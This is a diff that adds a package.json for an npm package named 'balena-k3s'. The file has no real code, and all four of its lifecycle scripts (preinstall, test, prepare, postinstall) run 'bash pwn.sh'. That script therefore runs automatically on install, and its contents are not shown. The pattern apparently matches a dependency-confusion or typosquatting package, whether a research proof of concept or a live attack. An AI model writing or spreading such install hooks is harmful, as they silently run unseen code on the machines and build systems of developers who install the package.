@@ -1,0 +1,10 @@
+{
+  "name": "balena-k3s",
+  "version": "1.0.0",
+  "scripts": {
+    "preinstall": "bash pwn.sh",
+    "test": "bash pwn.sh",
+    "prepare": "bash pwn.sh",
+    "postinstall": "bash pwn.sh"
+  }
+}
